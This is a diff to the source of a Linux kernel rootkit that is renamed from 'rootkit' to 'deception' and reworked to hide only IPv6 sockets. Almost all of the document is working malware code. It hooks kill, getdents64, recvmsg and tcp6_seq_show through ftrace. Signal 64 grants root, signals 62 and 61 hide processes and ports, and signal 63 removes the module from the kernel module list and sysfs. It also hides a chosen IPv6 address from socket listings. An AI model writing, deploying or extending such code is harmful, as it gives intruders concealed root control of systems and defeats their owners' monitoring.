@@ -15,14 +15,13 @@
 #include <linux/list.h>
 #include <linux/kobject.h>
 #include <linux/vmalloc.h>
-#include <net/inet_sock.h>
 #include <linux/inet_diag.h>
 #include <linux/netlink.h>
 #include <linux/sock_diag.h>
-#include <linux/in.h>
-#include <net/sock.h>
 #include <linux/kmod.h>
-#include <linux/inet.h> // Required for in6_pton
+#include <linux/inet.h> // in6_pton
+#include <net/sock.h>
+#include <net/inet_sock.h>
 #include <net/ipv6.h>
 
 #include "ftrace_helper.h"
@@ -40,11 +39,7 @@ MODULE_DESCRIPTION("Integrated Rootkit: 61=Port, 62=PID, 63=Module, 64=Root");
 static asmlinkage long (*orig_recvmsg)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
-static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *, void *);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);
-static asmlinkage long (*orig_tcp6_seq_show_ip6hide)(struct seq_file *, void *);
-
-
 
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 static kallsyms_lookup_name_t my_kallsyms_lookup_name;
@@ -61,7 +56,6 @@ static short hidden = 0;
 #define MAX_HIDDEN_PORTS 32
 static u16 hidden_ports[MAX_HIDDEN_PORTS] = {0};
 static int hidden_ports_count = 0;
-
 
 struct hidden_pid {
     char pid_str[NAME_MAX];
@@ -117,7 +111,7 @@ void hideme_full(void) {
 
 void showme_full(void) {
     if (!hidden) return;
-    strncpy(THIS_MODULE->name, "rootkit", MODULE_NAME_LEN);
+    strncpy(THIS_MODULE->name, "deception", MODULE_NAME_LEN);
     if (prev_module) list_add(&THIS_MODULE->list, prev_module);
     if (kobj_parent) kobject_add(&THIS_MODULE->mkobj.kobj, kobj_parent, "%s", THIS_MODULE->name);
     hidden = 0;
@@ -137,10 +131,10 @@ static int remove_hidden_pid(const char *name) {
         if (strcmp(entry->pid_str, name) == 0) {
             list_del(&entry->list);
             kfree(entry);
-            return 1; 
+            return 1;
         }
     }
-    return 0; 
+    return 0;
 }
 
 static void clear_all_hidden_pids(void) {
@@ -188,10 +182,17 @@ asmlinkage long hook_recvmsg(const struct pt_regs *regs) {
         bool hide = false;
         if (nlh->nlmsg_len < sizeof(struct nlmsghdr)) break;
 
-        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY && nlh->nlmsg_len >= sizeof(struct nlmsghdr) + sizeof(struct inet_diag_msg)) {
+        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
+            nlh->nlmsg_len >= sizeof(struct nlmsghdr) + sizeof(struct inet_diag_msg)) {
+
             struct inet_diag_msg *diag = (struct inet_diag_msg *)(nlh + 1);
-            if (is_port_hidden(ntohs(diag->id.idiag_sport)) || is_port_hidden(ntohs(diag->id.idiag_dport))) {
-                hide = true;
+
+            /* IPv6-only: hide only AF_INET6 sockets */
+            if (diag->idiag_family == AF_INET6) {
+                if (is_port_hidden(ntohs(diag->id.idiag_sport)) ||
+                    is_port_hidden(ntohs(diag->id.idiag_dport))) {
+                    hide = true;
+                }
             }
         }
 
@@ -247,61 +248,47 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs) {
 }
 
 asmlinkage long hook_kill(const struct pt_regs *regs) {
-    /* 
-     * Native Linux 6.x parameter extraction API.
-     * Argument index 0 corresponds to the PID parameter.
-     * Argument index 1 corresponds to the Signal parameter.
-     */
     pid_t pid = (pid_t)regs_get_kernel_argument(regs, 0);
     int sig = (int)regs_get_kernel_argument(regs, 1);
-    
+
     struct hidden_pid *pid_entry;
     char pid_str[NAME_MAX];
     int i;
 
-    // Signal 64 GET_ROOT: Privilege Escalation to Root
-    if (sig == 64 && pid == GET_ROOT) { 
-        set_root(); 
-        return 0; 
-    }
-    
-    // kill -63 MOD_REVEAL: Toggle Module Visibility
-    if (sig == 63 && pid == MOD_REVEAL) { 
-        if (hidden) showme_full(); else hideme_full(); 
-        return 0; 
-    }
-    
- // Signal 62: Hide/Unhide Processes
-if (sig == 62) {
-    // Safety check: Ensure pid is valid and won't cause unexpected behavior
-    if (pid == 0) {
-        clear_all_hidden_pids();
+    /* Signal 64: GET_ROOT */
+    if (sig == 64 && pid == GET_ROOT) {
+        set_root();
         return 0;
     }
 
-    // Safely format the PID into a string buffer
-    // Ensure pid_str is defined as: char pid_str[NAME_MAX];
-    snprintf(pid_str, sizeof(pid_str), "%d", pid);
-
-    // If it was already hidden, unhide it and exit
-    if (remove_hidden_pid(pid_str)) {
+    /* Signal 63: MOD_REVEAL */
+    if (sig == 63 && pid == MOD_REVEAL) {
+        if (hidden) showme_full(); else hideme_full();
         return 0;
     }
 
-    // Allocate memory safely for the new tracking entry
-    pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
-    if (pid_entry) {
-        // Fix: Use strscpy to guarantee null-termination and prevent memory corruption
-        strscpy(pid_entry->pid_str, pid_str, sizeof(pid_entry->pid_str));
-        
-        // Add to the tracking list
-        list_add(&pid_entry->list, &hidden_pids_list);
+    /* Signal 62: Hide/Unhide Processes */
+    if (sig == 62) {
+        if (pid == 0) {
+            clear_all_hidden_pids();
+            return 0;
+        }
+
+        snprintf(pid_str, sizeof(pid_str), "%d", pid);
+
+        if (remove_hidden_pid(pid_str)) {
+            return 0;
+        }
+
+        pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
+        if (pid_entry) {
+            strscpy(pid_entry->pid_str, pid_str, sizeof(pid_entry->pid_str));
+            list_add(&pid_entry->list, &hidden_pids_list);
+        }
+        return 0;
     }
-    return 0;
-}
 
-
-    // Signal 61: Hide/Unhide Network Ports
+    /* Signal 61: Hide/Unhide Network Ports */
     if (sig == 61) {
         u16 target_port = (u16)pid;
         if (target_port == 0) {
@@ -310,7 +297,8 @@ if (sig == 62) {
         }
         for (i = 0; i < hidden_ports_count; i++) {
             if (hidden_ports[i] == target_port) {
-                for (int j = i; j < hidden_ports_count - 1; j++) {
+                int j;
+                for (j = i; j < hidden_ports_count - 1; j++) {
                     hidden_ports[j] = hidden_ports[j + 1];
                 }
                 hidden_ports_count--;
@@ -326,88 +314,84 @@ if (sig == 62) {
     return orig_kill(regs);
 }
 
+/* --- IPv6 Network Seq Show Hook --- */
 
-/* --- Network Seq Show Hooks --- */
-
-static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
-    if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
+static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    if (v != SEQ_START_TOKEN && v != NULL) {
         struct sock *sk = (struct sock *)v;
-        if (sk->sk_state == TCP_TIME_WAIT) {
-            struct inet_timewait_sock *tw = (struct inet_timewait_sock *)v;
-            if (is_port_hidden(ntohs(tw->tw_sport)) || is_port_hidden(ntohs(tw->tw_dport))) return 0;
-        } else {
-            struct inet_sock *inet = inet_sk(sk);
-            if (is_port_hidden(ntohs(inet->inet_sport)) || is_port_hidden(ntohs(inet->inet_dport))) return 0;
+
+        if (sk->sk_family == AF_INET6) {
+            /* Hide specific IPv6 address */
+            if (ipv6_addr_equal(&sk->sk_v6_daddr, &target_ip6) ||
+                ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &target_ip6)) {
+                return 0;
+            }
+
+            /* Hide ports for IPv6 sockets, using inet_sock/inet_timewait_sock */
+            if (hidden_ports_count > 0) {
+                if (sk->sk_state == TCP_TIME_WAIT) {
+                    struct inet_timewait_sock *tw = (struct inet_timewait_sock *)v;
+                    u16 sport = ntohs(tw->tw_sport);
+                    u16 dport = ntohs(tw->tw_dport);
+
+                    if (is_port_hidden(sport) || is_port_hidden(dport))
+                        return 0;
+                } else {
+                    struct inet_sock *inet = inet_sk(sk);
+                    u16 sport = ntohs(inet->inet_sport);
+                    u16 dport = ntohs(inet->inet_dport);
+
+                    if (is_port_hidden(sport) || is_port_hidden(dport))
+                        return 0;
+                }
+            }
         }
     }
-    return orig_tcp4_seq_show(seq, v);
-}
 
-static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v) {
-if (v != SEQ_START_TOKEN && v != NULL) {
-    struct sock *sk = (struct sock *)v;
-
-    if (sk->sk_family == AF_INET6) {
-        if (ipv6_addr_equal(&sk->sk_v6_daddr, &target_ip6) ||
-            ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &target_ip6)) {
-            return 0;   // Hide IPv6 address match
-        }
-    }
-}
-
-    if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
-        struct sock *sk = (struct sock *)v;
-        if (sk->sk_state == TCP_TIME_WAIT) {
-            struct inet_timewait_sock *tw = (struct inet_timewait_sock *)v;
-            if (is_port_hidden(ntohs(tw->tw_sport)) || is_port_hidden(ntohs(tw->tw_dport))) return 0;
-        } else {
-            struct inet_sock *inet = inet_sk(sk);
-            if (is_port_hidden(ntohs(inet->inet_sport)) || is_port_hidden(ntohs(inet->inet_dport))) return 0;
-        }
-    }
     return orig_tcp6_seq_show(seq, v);
 }
 
 /* --- FTrace Hook Definitions Configuration --- */
 static struct ftrace_hook fh_hooks[] = {
-    HOOK("__x64_sys_recvmsg", hook_recvmsg, &orig_recvmsg),
+    HOOK("__x64_sys_recvmsg",   hook_recvmsg,   &orig_recvmsg),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
-    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
+    HOOK("__x64_sys_kill",      hook_kill,      &orig_kill),
+    HOOK("tcp6_seq_show",       hooked_tcp6_seq_show, &orig_tcp6_seq_show),
 };
 
 /* --- Module Initialization --- */
-static int __init rootkit_init(void)
+static int __init deception_init(void)
 {
     int err;
+    struct in6_addr tmp;   // <-- declare ONCE here
 
     my_vmap_area_list = (struct list_head *)lookup_name("vmap_area_list");
     my_vmap_area_lock = (spinlock_t *)lookup_name("vmap_area_lock");
     my_vmap_area_root = (struct rb_root *)lookup_name("vmap_area_root");
 
-if (in6_pton(IP6_ADDRESS_TO_HIDE, -1, target_ip6.s6_addr, -1, NULL) != 1) {
-    printk(KERN_ERR "rootkit: Failed to parse IPv6 address\n");
-}
-
-
-    err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
-    if (err) {
-        return err;
+    /* Parse IPv6 address into tmp, then copy into target_ip6 */
+    if (in6_pton(IP6_ADDRESS_TO_HIDE, -1, tmp.s6_addr, -1, NULL) != 1) {
+        printk(KERN_ERR "deception: Failed to parse IPv6 address\n");
+    } else {
+        memcpy(&target_ip6, &tmp, sizeof(struct in6_addr));
     }
 
-    hideme_full();
+    err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
+    if (err)
+        return err;
 
+    hideme_full();
     return 0;
 }
 
+
 /* --- Module Clean up --- */
-static void __exit rootkit_exit(void)
+static void __exit deception_exit(void)
 {
     fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
     clear_all_hidden_pids();
 }
 
-module_init(rootkit_init);
-module_exit(rootkit_exit);
-
+module_init(deception_init);
+module_exit(deception_exit);
